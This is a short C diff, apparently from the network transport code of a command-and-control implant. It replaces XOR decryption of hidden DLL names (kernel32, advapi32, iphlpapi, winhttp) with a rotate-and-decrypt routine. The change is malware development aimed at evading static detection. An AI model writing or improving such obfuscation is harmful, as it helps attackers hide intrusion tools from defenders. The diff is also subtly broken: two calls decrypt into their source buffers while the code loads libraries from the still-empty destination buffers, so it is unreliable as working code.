@@ -64,14 +64,9 @@ BOOL TransportInit( ) {
     unsigned char d_advapi32[14] = {0};
     unsigned char d_iphlpapi[14] = {0};
 
-    xor_dec((char *)s_kernel32, sizeof(s_kernel32), (char *)s_xkey, sizeof(s_xkey));
-    mem_cpy(d_kernel32,s_kernel32,12);
-
-    xor_dec((char *)s_advapi32, sizeof(s_advapi32), (char *)s_xkey, sizeof(s_xkey));
-    mem_cpy(d_advapi32,s_advapi32,12);
-
-    xor_dec((char *)s_iphlpapi, sizeof(s_iphlpapi), (char *)s_xkey, sizeof(s_xkey));
-    mem_cpy(d_iphlpapi,s_iphlpapi,12);
+    ROL_AND_DECRYPT((char *)s_kernel32, sizeof(s_kernel32), 1, d_kernel32, (char *)s_xkey, sizeof(s_xkey));
+    ROL_AND_DECRYPT((char *)s_advapi32, sizeof(s_advapi32), 1, s_advapi32, (char *)s_xkey, sizeof(s_xkey));
+    ROL_AND_DECRYPT((char *)s_iphlpapi, sizeof(s_iphlpapi), 1, s_iphlpapi, (char *)s_xkey, sizeof(s_xkey));
 
     HANDLE p_kernel32 = LocalGetModuleHandle(d_kernel32);
     HANDLE p_advapi32 = LoadLibrary(d_advapi32);
@@ -253,7 +248,8 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 #if CONFIG_OBFUSCATION == TRUE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_WINHTTP;
-    char * winhttp = xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk));
+    unsigned char winhttp[sizeof(s_string)] = {0};
+    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, winhttp, (char *)s_xk, sizeof(s_xk));
 
     //winhttp[11] = 0x00;
 
